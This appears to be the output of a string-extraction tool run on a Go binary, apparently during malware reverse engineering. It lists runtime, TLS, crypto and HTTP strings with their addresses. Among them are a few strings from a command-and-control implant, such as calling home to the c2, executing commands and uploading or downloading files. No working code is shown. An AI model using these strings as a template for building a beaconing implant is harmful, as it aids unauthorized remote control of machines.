+0xc00010e038         0x7347cf             2          "Lt"                                                        heap                 rodata              
+0xc00010e0d8         0x734eb1             6          "Common"                                                    heap                 rodata              
+0xc000132138         0x734787             2          "80"                                                        heap                 rodata              
+0xc00010e918         0x7362a8             11         "END_HEADERS"                                               heap                 rodata              
+0xc00010ed28         0x7362b3             11         "ENABLE_PUSH"                                               heap                 rodata              
+0xc00010ed58         0x739188             19         "INITIAL_WINDOW_SIZE"                                       heap                 rodata              
+0xc00010ee08         0x7372d9             14         "Content-Length"                                            heap                 rodata              
+0xc00010ef98         0x734d91             6          "active"                                                    heap                 rodata              
+0xc00010e1c8         0x7361af             10         "ClassCSNET"                                                heap                 rodata              
+0xc00010e298         0x738377             16         "RCodeFormatError"                                          heap                 rodata              
+0xc00010e2c8         0x73779b             14         "RCodeNameError"                                            heap                 rodata              
+0xc00010e368         0x735755             8          "Question"                                                  heap                 rodata              
+
+Total HEAP strings found: 509
+================================================================================
+
+================================================================================
+
+
+================================================================================
+STRING STRUCTURE EXTRACTION (DATA + RODATA)
+================================================================================
+[*] String structure size: 16 bytes
+[*] Scanning for structures in: DATA, RODATA
+[*] Scanning for data in: DATA, RODATA, TEXT, TYPES
+
+[*] Scanning RODATA: 0x6a8000 - 0x9759d8
+[*] Section size: 2870.46 KB
+[*] Found 5935 candidates in rodata
+
+[*] Scanning DATA: 0x9b4020 - 0x9c0612
+[*] Section size: 49.49 KB
+[*] Found 830 candidates in data
+
+[+] Found 1289 string structures total (checked 6765 candidates)
+================================================================================
+
+
+====================================================================================================
+STRING STRUCTURES (DATA + RODATA) ---> DATA BYTES IN (DATA/RODATA/TEXT/TYPES)
+====================================================================================================
+Struct Addr          Data Addr            Length     Value                                                        Struct Location      Data Location       
+----------------------------------------------------------------------------------------------------
+0x751ea0             0x48a640             14         "I;fvjUH��H�� "                                             rodata               text                
+0x752048             0x5cf5e0             9          "I;fv$UH�"                                                  rodata               text                
+0x7aab48             0x800171             85         "ng/json.isZero func(reflect.Value) bool; encoding/json.quoted bool; encoding/json.enc" rodata               rodata              
+0x7ab110             0x55e028             186        " ]�H�D$H�\$H�L$H�|$ �����H�D$H�\$H�L$H�|$ �L�l$0M9,$u�I�$$���������������������H�|$ H� � �q/�������������������I;fv%UH��H�� M�f M��uDH�|$H� f��0��H�� ]�H�D$H�\$H�L$H�|$ ��" rodata               text                
+0x7abee0             0x73acd9             23         "Couldn't load cert file"                                    rodata               rodata              
+0x7abef0             0x7415b2             36         "[+] Calling home to c2 to get cmd..."                       rodata               rodata              
+0x7abf00             0x7398e1             20         "[+] Executing cmd..."                                       rodata               rodata              
+0x7abf10             0x7415d6             36         "[+] Quitting due to quit cmd from c2"                       rodata               rodata              
+0x7abf20             0x740727             34         "[-] Invalid upload command syntax."                         rodata               rodata              
+0x7abf30             0x7415fa             36         "[-] Invalid download command syntax."                       rodata               rodata              
+0x7abf40             0x738a2b             18         "[+] Uploaded file."                                         rodata               rodata              
+0x7abf50             0x73f3fa             32         "[+] Successfully downloaded file"                           rodata               rodata              
+0x7abf60             0x741e6b             37         "bytes.Buffer: truncation out of range"                      rodata               rodata              
+0x7abf70             0x73fd7c             33         "bytes.Buffer.Grow: negative count"                          rodata               rodata              
+0x7abf80             0x743a57             41         "bytes.Buffer.WriteTo: invalid Write count"                  rodata               rodata              
+0x7abf90             0x73d28c             28         "bytes: negative Repeat count"                               rodata               rodata              
+0x7abfa0             0x741642             36         "bytes: Repeat output length overflow"                       rodata               rodata              
+0x7abfb0             0x743a80             41         "bytes.Reader.WriteTo: invalid Write count"                  rodata               rodata              
+0x7abfc0             0x73ec1a             31         "fmt: unknown base; can't happen"                            rodata               rodata              
+0x7ac070             0x73c2e2             26         "empty buffer in CopyBuffer"                                 rodata               rodata              
+0x7ac080             0x74801c             55         "internal error: negative process handle reference count"    rodata               rodata              
+0x7ac090             0x74728e             51         "internal error: too many releases of process handle"        rodata               rodata              
+0x7ac0a0             0x745409             45         "handleTransientAcquire called in invalid mode"              rodata               rodata              
+0x7ac0b0             0x73ca00             27         "inconsistent process status"                                rodata               rodata              
+0x7ac0c0             0x745436             45         "handleTransientRelease called in invalid mode"              rodata               rodata              
+0x7ac0d0             0x73f41a             32         "pidStatus called in invalid mode"                           rodata               rodata              
+0x7ac0e0             0x73673a             12         "can't happen"                                               rodata               rodata              
+0x7ac0f0             0x738a4f             18         "cannot be negative"                                         rodata               rodata              
+0x7ac100             0x743aa9             41         "unexpected call to os.Exit(0) during test"                  rodata               rodata              
+0x7ac110             0x736219             11         "unreachable"                                                rodata               rodata              
+0x7ac120             0x73e440             30         "runtime.AddCleanup: ptr is nil"                             rodata               rodata              
+0x7ac130             0x749987             63         "runtime.AddCleanup: ptr is equal to arg, cleanup will never run" rodata               rodata              
+0x7ac140             0x7440bf             42         "runtime.AddCleanup: ptr is arena-allocated"                 rodata               rodata              
+0x7ac150             0x7458c9             46         "runtime.AddCleanup: ptr not in allocated block"             rodata               rodata              
+0x7ac290             0x748431             56         "strings: illegal use of non-zero Builder copied by value"   rodata               rodata              
+0x7ac2a0             0x741666             36         "strings.Builder.Grow: negative count"                       rodata               rodata              
+0x7ac2b0             0x746946             49         "strings.Reader.WriteTo: invalid WriteString count"          rodata               rodata              
+0x7ac2c0             0x74168a             36         "strings: Join output length overflow"                       rodata               rodata              
+0x7ac2d0             0x743326             40         "time: Stop called on uninitialized Timer"                   rodata               rodata              
+0x7ac2e0             0x743ad2             41         "time: Reset called on uninitialized Timer"                  rodata               rodata              
+0x7ac2f0             0x74265e             38         "time: missing Location in call to Date"                     rodata               rodata              
+0x7ac320             0x741eb5             37         "crypto: Size of unknown hash function"                      rodata               rodata              
+0x7ac330             0x742d5b             39         "tls: internal error: wrong nonce length"                    rodata               rodata              
+0x7ac340             0x73ecb5             31         "TLS: sequence number wraparound"                            rodata               rodata              
+0x7ac350             0x739116             19         "unknown cipher type"                                        rodata               rodata              
+0x7ac360             0x74ad17             73         "tls: internal error: handshake returned an error but is marked successful" rodata               rodata              
+0x7ac380             0x746dde             50         "cryptobyte: attempted write while child is pending"         rodata               rodata              
+0x7ac390             0x737888             15         "unknown version"                                            rodata               rodata              
+0x7ac3a0             0x74bd17             92         "tls: handshake hash for a client certificate requested after discarding the handshake buffer" rodata               rodata              
+0x7ac3b0             0x73e49a             30         "called entry on non-entry node"                             rodata               rodata              
+0x7ac3c0             0x749a05             63         "internal/sync.HashTrieMap: ran out of hash bits while iterating" rodata               rodata              
+0x7ac3d0             0x7491e2             60         "called CompareAndDelete when value is not of comparable type" rodata               rodata              
+0x7ac3e0             0x748c23             58         "called CompareAndSwap when value is not of comparable type" rodata               rodata              
+0x7ac3f0             0x749a44             63         "internal/sync.HashTrieMap: ran out of hash bits while inserting" rodata               rodata              
+0x7ac550             0x740837             34         "adding nil Certificate to CertPool"                         rodata               rodata              
+0x7ac560             0x739995             20         "getCert can't be nil"                                       rodata               rodata              
+0x7ac570             0x742e45             39         "math/big: buffer too small to fit value"                    rodata               rodata              
+0x7ac580             0x73d3c0             28         "errors: target cannot be nil"                               rodata               rodata              
+0x7ac590             0x743416             40         "errors: target must be a non-nil pointer"                   rodata               rodata              
+0x7ac5a0             0x74768d             52         "errors: *target must be interface or implement error"       rodata               rodata              
+0x7ac5b0             0x74420f             42         "internal error: call to runtimeSource.Seed"                 rodata               rodata              
+0x7ac5c0             0x7378c4             15         "negative update"                                            rodata               rodata              
+0x7ac5d0             0x7460eb             47         "flow control update exceeds maximum window size"            rodata               rodata              
+0x7ac5e0             0x73dd00             29         "internal error: took too much"                              rodata               rodata              
+0x7ac5f0             0x743466             40         "Frame accessor called on non-owned Frame"                   rodata               rodata              
+0x7ac600             0x73681e             12         "out of range"                                               rodata               rodata              
+0x7ac610             0x7391d4             19         "err must be non-nil"                                        rodata               rodata              
+0x7ac620             0x7362df             11         "nil context"                                                rodata               rodata              
+0x7ac640             0x74204c             37         "RoundTrip on uninitialized ClientConn"                      rodata               rodata              
+0x7ac650             0x739a49             20         "assigned stream ID 0"                                       rodata               rodata              
+0x7ac660             0x73d430             28         "forgetting unknown stream id"                               rodata               rodata              
+0x7ac670             0x73a6bf             22         "malformed HTTP version"                                     rodata               rodata              
+0x7ac680             0x73aed3             23         "malformed HTTP response"                                    rodata               rodata              
+0x7ac690             0x73c44e             26         "malformed HTTP status code"                                 rodata               rodata              
+0x7ac6a0             0x737e27             16         "transport is nil"                                           rodata               rodata              
+0x7ac6b0             0x749758             62         "trying to put back buffer of the wrong size in the copyBufPool" rodata               rodata              
+0x7ac6c0             0x7372a1             14         "internal error"                                             rodata               rodata              
+0x7ac6d0             0x739246             19         "invalid Trailer key"                                        rodata               rodata              
+0x7ac6e0             0x73795a             15         "unexpected type"                                            rodata               rodata              
+0x7ac6f0             0x737969             15         "bad trailer key"                                            rodata               rodata              
+0x7ac700             0x73d4bc             28         "invalid empty Content-Length"                               rodata               rodata              
+0x7ac710             0x738bdb             18         "bad Content-Length"                                         rodata               rodata              
+0x7ac720             0x73cc37             27         "unsupported protocol scheme"                                rodata               rodata              
+0x7ac730             0x745af1             46         "net/http: internal error: misuse of tryDeliver"             rodata               rodata              
+0x7ac740             0x742071             37         "cannot create context from nil parent"                      rodata               rodata              
+0x7ac750             0x745544             45         "net/http: internal error: connCount underflow"              rodata               rodata              
+0x7ac760             0x735847             9          "nil error"                                                  rodata               rodata              
+0x7ac770             0x73e5c6             30         "persistConn was already in LRU"                             rodata               rodata              
+0x7ac810             0x746705             48         "strconv: illegal AppendFloat/FormatFloat bitSize"           rodata               rodata              
+0x7ac820             0x74352e             40         "ryuFtoaFixed32 called with negative prec"                   rodata               rodata              
+0x7ac830             0x74105d             35         "ryuFtoaFixed32 called with prec > 9"                        rodata               rodata              
+0x7ac840             0x746735             48         "not enough significant bits after mult64bitPow10"           rodata               rodata              
+0x7ac850             0x7418ca             36         "ryuFtoaFixed64 called with prec > 18"                       rodata               rodata              
+0x7ac860             0x746aff             49         "not enough significant bits after mult128bitPow10"          rodata               rodata              
+0x7ac870             0x744a29             43         "mult64bitPow10: power of 10 is out of range"                rodata               rodata              
+0x7ac880             0x745015             44         "mult128bitPow10: power of 10 is out of range"               rodata               rodata              
+0x7ac890             0x743c43             41         "strconv: illegal AppendInt/FormatInt base"                  rodata               rodata              
+0x7ac8a0             0x7485b9             56         "ptrEncoder.encode should have emptied ptrSeen via defers"   rodata               rodata              
+0x7ac8b0             0x73af5d             23         "unexpected map key type"                                    rodata               rodata              
+0x7ac9f0             0x74a7d9             69         "runtime.Pinner: found leaking pinned pointer; forgot to call Unpin()?" rodata               rodata              
+0x7aca00             0x7420bb             37         "runtime: allocation size out of range"                      rodata               rodata              
+0x7aca10             0x74a003             65         "runtime: function marked with #cgo nocallback called back into Go" rodata               rodata              
+0x7aca20             0x73cd0f             27         "makechan: size out of range"                                rodata               rodata              
+0x7aca30             0x73a7c7             22         "send on closed channel"                                     rodata               rodata              
+0x7aca40             0x739b89             20         "close of nil channel"                                       rodata               rodata              
+0x7aca50             0x73b015             23         "close of closed channel"                                    rodata               rodata              
+0x7aca60             0x744407             42         "non-empty mark queue after concurrent mark"                 rodata               rodata              
+0x7aca70             0x735f6b             10         "Bad varint"                                                 rodata               rodata              
+0x7aca80             0x73f18d             31         "runtime.Pinner: argument is nil"                            rodata               rodata              
+0x7aca90             0x74709a             50         "runtime.Pinner: object was allocated into an arena"         rodata               rodata              
+0x7acaa0             0x73e02c             29         "tried to unpin non-Go pointer"                              rodata               rodata              
+0x7acab0             0x7429ee             38         "arg size to reflect.call more than 1GB"                     rodata               rodata              
+0x7acac0             0x737587             14         "semaRoot queue"                                             rodata               rodata              
+0x7acad0             0x73cfcd             27         "makeslice: len out of range"                                rodata               rodata              
+0x7acae0             0x73cfe8             27         "makeslice: cap out of range"                                rodata               rodata              
+0x7acaf0             0x73d003             27         "growslice: len out of range"                                rodata               rodata              
+0x7acb00             0x73f266             31         "unsafe.String: len out of range"                            rodata               rodata              
+0x7acb10             0x7456ac             45         "unsafe.String: ptr is nil and len is not zero"              rodata               rodata              
+0x7acb20             0x73e92c             30         "unsafe.Slice: len out of range"                             rodata               rodata              
+0x7acb30             0x7451f9             44         "unsafe.Slice: ptr is nil and len is not zero"               rodata               rodata              
+0x7acb40             0x7395fc             19         "sync.Cond is copied"                                        rodata               rodata              
+0x7acb50             0x7355e5             8          "nil Pool"                                                   rodata               rodata              
+0x7acb60             0x73f99a             32         "sync: negative WaitGroup counter"                           rodata               rodata              
+0x7acb70             0x748acb             57         "sync: WaitGroup misuse: Add called concurrently with Wait"  rodata               rodata              
+0x7acb80             0x748f56             59         "sync: WaitGroup is reused before previous Wait has returned" rodata               rodata              
+0x7acb90             0x73f9da             32         "bufio: tried to fill full buffer"                           rodata               rodata              
+0x7acba0             0x744d04             43         "bufio: tried to rewind past start of buffer"                rodata               rodata              
+0x7acbb0             0x747a72             53         "bufio.Scan: too many empty tokens without progressing"      rodata               rodata              
+0x7acbc0             0x73b9c7             24         "flate: maxBits too large"                                   rodata               rodata              
+0x7acbd0             0x7403ee             33         "leafCounts[maxBits][maxBits] != n"                          rodata               rodata              
+0x7acbe0             0x73a9d7             22         "unexpected length code"                                     rodata               rodata              
+0x7acbf0             0x7370d4             13         "not available"                                              rodata               rodata              
+0x7acc00             0x742a3a             38         "arch-specific Castagnoli not available"                     rodata               rodata              
+0x7acc30             0x735b95             9          "invalid n"                                                  rodata               rodata              
+0x7acc40             0x7388d6             17         "unknown type kind"                                          rodata               rodata              
+0x7acc50             0x748779             56         "non-empty pointer map passed for non-pointer-size values"   rodata               rodata              
+0x7acc60             0x737b85             15         "invalid argSize"                                            rodata               rodata              
+0x7acc70             0x736552             11         "bad argSize"                                                rodata               rodata              
+0x7acc80             0x743eaa             41         "can't call pointer on a non-pointer Value"                  rodata               rodata              
+0x7acc90             0x7482b0             55         "reflect: internal error: invalid use of makeMethodValue"    rodata               rodata              
+0x7acca0             0x73e968             30         "MapIter.Key called before Next"                             rodata               rodata              
+0x7accb0             0x7437ae             40         "MapIter.Key called on exhausted iterator"                   rodata               rodata              
+0x7accc0             0x73f9fa             32         "MapIter.Value called before Next"                           rodata               rodata              
+0x7accd0             0x744629             42         "MapIter.Value called on exhausted iterator"                 rodata               rodata              
+0x7acce0             0x74b12c             77         "MapIter.Next called on an iterator that does not have an associated map Value" rodata               rodata              
+0x7accf0             0x743ed3             41         "MapIter.Next called on exhausted iterator"                  rodata               rodata              
+0x7acd00             0x74040f             33         "reflect: slice index out of range"                          rodata               rodata              
+0x7acd10             0x740cbb             34         "reflect: Field index out of bounds"                         rodata               rodata              
+0x7acd20             0x744d2f             43         "reflect: nil type passed to Type.Implements"                rodata               rodata              
+0x7acd30             0x747aa7             53         "reflect: non-interface type passed to Type.Implements"      rodata               rodata              
+0x7acd40             0x745706             45         "reflect: nil type passed to Type.AssignableTo"              rodata               rodata              
+0x7acd50             0x745d75             46         "reflect: nil type passed to Type.ConvertibleTo"             rodata               rodata              
+0x7acd60             0x735bb0             9          "bad indir"                                                  rodata               rodata              
+0x7acd70             0x743efc             41         "reflect.Value.Addr of unaddressable value"                  rodata               rodata              
+0x7acd80             0x7422c1             37         "reflect.Value.Bytes of non-byte slice"                      rodata               rodata              
+0x7acd90             0x7422e6             37         "reflect.Value.Bytes of non-byte array"                      rodata               rodata              
+0x7acda0             0x74637d             47         "reflect.Value.Bytes of unaddressable byte array"            rodata               rodata              
+0x7acdb0             0x74230b             37         "reflect.Value.Bytes of non-rune slice"                      rodata               rodata              
+0x7acdc0             0x73c740             26         "unknown ABI parameter kind"                                 rodata               rodata              
+0x7acdd0             0x745733             45         "reflect: internal error: invalid method index"              rodata               rodata              
+0x7acde0             0x742330             37         "method ABI and value ABI do not align"                      rodata               rodata              
+0x7acdf0             0x73aa03             22         "unexpected method step"                                     rodata               rodata              
+0x7ace00             0x73a351             21         "unexpected value step"                                      rodata               rodata              
+0x7ace10             0x741c96             36         "method ABI and value ABI don't align"                       rodata               rodata              
+0x7ace20             0x748fcc             59         "reflect: reflect.Value.Elem on an invalid notinheap pointer" rodata               rodata              
+0x7ace30             0x740451             33         "reflect: Field index out of range"                          rodata               rodata              
+0x7ace40             0x740472             33         "reflect: array index out of range"                          rodata               rodata              
+0x7ace50             0x740cdd             34         "reflect: string index out of range"                         rodata               rodata              
+0x7ace60             0x74ba04             85         "reflect.Value.Interface: cannot return value obtained from unexported field or method" rodata               rodata              
+0x7ace70             0x7493fe             60         "reflect: call of reflect.Value.Len on ptr to non-array Value" rodata               rodata              
+0x7ace80             0x74988e             62         "reflect: reflect.Value.Pointer on an invalid notinheap pointer" rodata               rodata              
+0x7ace90             0x7437d6             40         "reflect.Value.SetBytes of non-byte slice"                   rodata               rodata              
+0x7acea0             0x7437fe             40         "reflect.Value.setRunes of non-rune slice"                   rodata               rodata              
+0x7aceb0             0x74a5fa             68         "reflect: reflect.Value.UnsafePointer on an invalid notinheap pointer" rodata               rodata              
+0x7acec0             0x73fa1a             32         "reflect.Value.Grow: negative len"                           rodata               rodata              
+0x7aced0             0x740cff             34         "reflect.Value.Grow: slice overflow"                         rodata               rodata              
+0x7acee0             0x74128d             35         "reflect.MakeSlice of non-slice type"                        rodata               rodata              
+0x7acef0             0x73f2a4             31         "reflect.MakeSlice: negative len"                            rodata               rodata              
+0x7acf00             0x73f2c3             31         "reflect.MakeSlice: negative cap"                            rodata               rodata              
+0x7acf10             0x73d890             28         "reflect.MakeSlice: len > cap"                               rodata               rodata              
+0x7acf20             0x738e87             18         "reflect: Zero(nil)"                                         rodata               rodata              
+0x7acf30             0x738909             17         "reflect: New(nil)"                                          rodata               rodata              
+0x7acf40             0x74bbb0             86         "reflect: New of type that may not be allocated in heap (possibly undefined cgo C type)" rodata               rodata              
+0x7acf50             0x74319f             39         "syscall.releaseForkLock: negative count"                    rodata               rodata              
+0x7acf60             0x74ab21             71         "too many concurrent operations on a single file or socket (max 1048575)" rodata               rodata              
+0x7acf70             0x73c138             25         "inconsistent poll.fdMutex"                                  rodata               rodata              
+0x7acf90             0x74467d             42         "sync/atomic: store of nil value into Value"                 rodata               rodata              
+0x7acfa0             0x749007             59         "sync/atomic: store of inconsistently typed value into Value" rodata               rodata              
+0x7acfb0             0x74ab68             71         "crypto/ecdsa: use of custom curves is not allowed in FIPS 140-only mode" rodata               rodata              
+0x7acfc0             0x749042             59         "ecdsa: internal error: ordInverse produced an invalid value" rodata               rodata              
+0x7acfd0             0x7482e7             55         "ecdsa: internal error: shift can only be by 1 to 7 bits"    rodata               rodata              
+0x7acfe0             0x746cb8             49         "ecdsa: internal error: truncated hash is too long"          rodata               rodata              
+0x7ad100             0x747adc             53         "crypto/elliptic: attempted operation on invalid point"      rodata               rodata              
+0x7ad110             0x746ce9             49         "crypto/elliptic: internal error: invalid encoding"          rodata               rodata              
+0x7ad120             0x747162             50         "crypto/elliptic: nistec rejected normalized scalar"         rodata               rodata              
+0x7ad130             0x748d45             58         "crypto/elliptic: ScalarMult was called on an invalid point" rodata               rodata              
+0x7ad140             0x747558             51         "crypto/elliptic: Add was called on an invalid point"        rodata               rodata              
+0x7ad150             0x74831e             55         "cipher.NewCBCEncrypter: IV length must equal block size"    rodata               rodata              
+0x7ad160             0x74b863             83         "crypto/cipher: use of CBC with non-AES ciphers is not allowed in FIPS 140-only mode" rodata               rodata              
+0x7ad170             0x741cde             36         "crypto/cipher: input not full blocks"                       rodata               rodata              
+0x7ad180             0x743876             40         "crypto/cipher: output smaller than input"                   rodata               rodata              
+0x7ad190             0x742433             37         "crypto/cipher: invalid buffer overlap"                      rodata               rodata              
+0x7ad1a0             0x748859             56         "crypto/cipher: internal error: generic CBC used with AES"   rodata               rodata              
+0x7ad1b0             0x73d12c             27         "cipher: incorrect length IV"                                rodata               rodata              
+0x7ad1c0             0x748355             55         "cipher.NewCBCDecrypter: IV length must equal block size"    rodata               rodata              
+0x7ad1d0             0x748b3d             57         "crypto/cipher: invalid buffer overlap of output and input"  rodata               rodata              
+0x7ad1e0             0x74a3db             67         "crypto/cipher: invalid buffer overlap of output and additional data" rodata               rodata              
+0x7ad1f0             0x747194             50         "crypto/cipher: incorrect nonce length given to GCM"         rodata               rodata              
+0x7ad200             0x7431ed             39         "crypto/cipher: incorrect GCM nonce size"                    rodata               rodata              
+0x7ad210             0x7438c6             40         "crypto/cipher: message too large for GCM"                   rodata               rodata              
+0x7ad220             0x742458             37         "crypto/cipher: incorrect GCM tag size"                      rodata               rodata              
+0x7ad230             0x73fb3a             32         "crypto/des: input not full block"                           rodata               rodata              
+0x7ad240             0x740538             33         "crypto/des: output not full block"                          rodata               rodata              
+0x7ad250             0x740d65             34         "crypto/des: invalid buffer overlap"                         rodata               rodata              
+0x7ad260             0x74b909             83         "crypto/hmac: use of keys shorter than 112 bits is not allowed in FIPS 140-only mode" rodata               rodata              
+0x7ad270             0x74c06f             97         "crypto/hmac: use of hash functions other than SHA-2 or SHA-3 is not allowed in FIPS 140-only mode" rodata               rodata              
+0x7ad280             0x740da9             34         "crypto/rc4: invalid buffer overlap"                         rodata               rodata              
+0x7ad290             0x7498cc             62         "crypto/sha1: use of SHA-1 is not allowed in FIPS 140-only mode" rodata               rodata              
+0x7ad2a0             0x735bdd             9          "d.nx != 0"                                                  rodata               rodata              
+0x7ad2b0             0x746d1a             49         "chacha20poly1305: bad nonce length passed to Seal"          rodata               rodata              
+0x7ad2c0             0x74247d             37         "chacha20poly1305: plaintext too large"                      rodata               rodata              
+0x7ad2d0             0x746d4b             49         "chacha20poly1305: bad nonce length passed to Open"          rodata               rodata              
+0x7ad2e0             0x742aac             38         "chacha20poly1305: ciphertext too large"                     rodata               rodata              
+0x7ad2f0             0x7438ee             40         "chacha20poly1305: invalid buffer overlap"                   rodata               rodata              
+0x7ad300             0x7446fb             42         "poly1305: write to MAC after Sum or Verify"                 rodata               rodata              
+0x7ad310             0x7471c6             50         "chacha20: SetCounter attempted to rollback counter"         rodata               rodata              
+0x7ad320             0x7457ba             45         "context: internal error: missing cancel error"              rodata               rodata              
+0x7ad330             0x7352e2             7          "nil key"                                                    rodata               rodata              
+0x7ad340             0x73a44d             21         "key is not comparable"                                      rodata               rodata              
+0x7ad350             0x74ac86             72         "crypto/fips140: FIPS 140-3 mode enabled, but integrity check didn't pass" rodata               rodata              
+0x7ad380             0x73a4a1             21         "message limit reached"                                      rodata               rodata              
+0x7ad3a0             0x7424a2             37         "out does not point to an integer type"                      rodata               rodata              
+0x7ad3b0             0x7468b5             48         "out points to big.Int, but defaultValue does not"           rodata               rodata              
+0x7ad3c0             0x739e6d             20         "invalid integer type"                                       rodata               rodata              
+0x7ad3d0             0x73c844             26         "cryptobyte: internal error"                                 rodata               rodata              
+0x7ad3e0             0x749bbe             63         "cryptobyte: BuilderContinuation reallocated a fixed-size buffer" rodata               rodata              
+0x7ad3f0             0x74b48d             80         "crypto/ecdh: internal error: nistec ScalarBaseMult failed for a fixed-size input" rodata               rodata              
+0x7ad400             0x749bfd             63         "crypto/ecdh: internal error: public key is the identity element" rodata               rodata              
+0x7ad470             0x7490f3             59         "crypto/md5: use of MD5 is not allowed in FIPS 140-only mode" rodata               rodata              
+0x7ad4a0             0x737c48             15         "invalid boolean"                                            rodata               rodata              
+0x7ad4b0             0x737163             13         "empty integer"                                              rodata               rodata              
+0x7ad4c0             0x73e33b             29         "integer not minimally-encoded"                              rodata               rodata              
+0x7ad4d0             0x7389a2             17         "integer too large"                                          rodata               rodata              
+0x7ad4e0             0x73ab37             22         "zero length BIT STRING"                                     rodata               rodata              
+0x7ad4f0             0x740dcb             34         "invalid padding bits in BIT STRING"                         rodata               rodata              
+0x7ad500             0x73e358             29         "zero length OBJECT IDENTIFIER"                              rodata               rodata              
+0x7ad510             0x73c878             26         "base 128 integer too large"                                 rodata               rodata              
+0x7ad520             0x73fc1a             32         "integer is not minimally encoded"                           rodata               rodata              
+0x7ad530             0x73c892             26         "truncated base 128 integer"                                 rodata               rodata              
+0x7ad540             0x743916             40         "NumericString contains invalid character"                   rodata               rodata              
+0x7ad550             0x744725             42         "PrintableString contains invalid character"                 rodata               rodata              
+0x7ad560             0x741d4a             36         "IA5String contains invalid character"                       rodata               rodata              
+0x7ad570             0x737c57             15         "non-minimal tag"                                            rodata               rodata              
+0x7ad580             0x73b3ad             23         "truncated tag or length"                                    rodata               rodata              
+0x7ad590             0x7405bc             33         "indefinite length found (not DER)"                          rodata               rodata              
+0x7ad5a0             0x7382a7             16         "length too large"                                           rodata               rodata              
+0x7ad5b0             0x741382             35         "superfluous leading zeros in length"                        rodata               rodata              
+0x7ad5c0             0x738fdd             18         "non-minimal length"                                         rodata               rodata              
+0x7ad5d0             0x73c1e7             25         "unknown Go type for slice"                                  rodata               rodata              
+0x7ad5e0             0x73a4b6             21         "sequence tag mismatch"                                      rodata               rodata              
+0x7ad5f0             0x738fef             18         "truncated sequence"                                         rodata               rodata              
+0x7ad600             0x739001             18         "sequence truncated"                                         rodata               rodata              
+0x7ad610             0x73770f             14         "data truncated"                                             rodata               rodata              
+0x7ad620             0x73c200             25         "explicit tag has no child"                                  rodata               rodata              
+0x7ad630             0x7457e7             45         "zero length explicit tag was not an asn1.Flag"              rodata               rodata              
+0x7ad640             0x7424ec             37         "explicitly tagged member didn't match"                      rodata               rodata              
+0x7ad650             0x7405dd             33         "struct contains unexported fields"                          rodata               rodata              
+0x7ad660             0x73c219             25         "invalid object identifier"                                  rodata               rodata              
+0x7ad670             0x73fc3a             32         "cannot represent time as UTCTime"                           rodata               rodata              
+0x7ad680             0x74393e             40         "cannot represent time as GeneralizedTime"                   rodata               rodata              
+0x7ad690             0x737c66             15         "unknown Go type"                                            rodata               rodata              
+0x7ad6a0             0x744d85             43         "explicit time type given to non-time member"                rodata               rodata              
+0x7ad6b0             0x746468             47         "explicit string type given to non-string member"            rodata               rodata              
+0x7ad6c0             0x73c8c6             26         "non sequence tagged as set"                                 rodata               rodata              
+0x7ad750             0x735c2e             9          "addVW len"                                                  rodata               rodata              
+0x7ad760             0x735c37             9          "subVW len"                                                  rodata               rodata              
+0x7ad770             0x734b30             5          "<nil>"                                                      rodata               rodata              
+0x7ad780             0x735c40             9          "underflow"                                                  rodata               rodata              
+0x7ad790             0x745dd1             46         "math/big: mismatched montgomery number lengths"             rodata               rodata              
+0x7ad7a0             0x73d9c4             28         "big: misuse of expNNWindowed"                               rodata               rodata              
+0x7ad7b0             0x736bf6             12         "invalid base"                                               rodata               rodata              
+0x7ad7c0             0x73ab63             22         "internal inconsistency"                                     rodata               rodata              
+0x7ad7d0             0x7382b7             16         "division by zero"                                           rodata               rodata              
+0x7ad7e0             0x7360dd             10         "impossible"                                                 rodata               rodata              
+0x7ad7f0             0x739ea9             20         "bad karatsuba length"                                       rodata               rodata              
+0x7ad800             0x73b3c4             23         "bad karatsubaSqr length"                                    rodata               rodata              
+0x7ad810             0x73a4cb             21         "invalid hex character"                                      rodata               rodata              
+0x7ad820             0x747b11             53         "unique.canonMap: ran out of hash bits while iterating"      rodata               rodata              
+0x7ad830             0x747b46             53         "unique.canonMap: ran out of hash bits while inserting"      rodata               rodata              
+0x7ad890             0x73eab2             30         "reflect: Len of non-array type"                             rodata               rodata              
+0x7ad8a0             0x741d6e             36         "reflect: NumField of non-struct type"                       rodata               rodata              
+0x7ad8b0             0x7452a9             44         "encoding alphabet contains newline character"               rodata               rodata              
+0x7ad8c0             0x7452d5             44         "encoding alphabet includes duplicate symbols"               rodata               rodata              
+0x7ad8d0             0x734cf7             5          "bad n"                                                      rodata               rodata              
+0x7ad8e0             0x739823             19         "evictCount overflow"                                        rodata               rodata              
+0x7ad8f0             0x74401b             41         "idna: internal error in punycode encoding"                  rodata               rodata              
+0x7ad900             0x73fcba             32         "initial table capacity too large"                           rodata               rodata              
+0x7ad910             0x740640             33         "table must have positive capacity"                          rodata               rodata              
+0x7ad920             0x7356ed             8          "overflow"                                                   rodata               rodata              
+0x7ad930             0x745e2d             46         "invariant failed: growthLeft is unexpectedly 0"             rodata               rodata              
+0x7ad940             0x742580             37         "bisect.Hash: unexpected argument type"                      rodata               rodata              
+0x7ad950             0x744ddb             43         "impl: package name must not contain slashes"                rodata               rodata              
+0x7ad960             0x741526             35         "chacha20: output smaller than input"                        rodata               rodata              
+0x7ad970             0x73fd1a             32         "chacha20: invalid buffer overlap"                           rodata               rodata              
+0x7ad980             0x73c996             26         "chacha20: counter overflow"                                 rodata               rodata              
+0x7ad990             0x747bb0             53         "chacha20: internal error: wrong dst and/or src length"      rodata               rodata              
+0x7ad9b0             0x73bb8f             24         "streamSafe was not reset"                                   rodata               rodata              
+0x7ad9c0             0x736c9e             12         "caller error"                                               rodata               rodata              
+0x7ad9d0             0x7377b7             14         "unknown dsbyte"                                             rodata               rodata              
+0x7adc00             0x73cbcb             27         "DATA frame with stream ID 0"                                rodata               rodata              
+0x7adc18             0x73ff08             33         "pad size larger than data payload"                          rodata               rodata              
+0x7adc30             0x73e56c             30         "HEADERS frame with stream ID 0"                             rodata               rodata              
+0x7adc48             0x73ee48             31         "PRIORITY frame with stream ID 0"                            rodata               rodata              
+0x7adc60             0x740ff4             35         "CONTINUATION frame with stream ID 0"                        rodata               rodata              
+0x7b1a28             0x738a19             18         "../cert/server.crt"                                         rodata               rodata              
+0x7b2b80             0x734b26             5          "linux"                                                      rodata               rodata              
+0x7b2b90             0x734b2b             5          "amd64"                                                      rodata               rodata              
+0x7b5680             0x736752             12         "close notify"                                               rodata               rodata              
+0x7b5690             0x738aa9             18         "unexpected message"                                         rodata               rodata              
+0x7b56a0             0x737293             14         "bad record MAC"                                             rodata               rodata              
+0x7b56b0             0x7383fd             17         "decryption failed"                                          rodata               rodata              
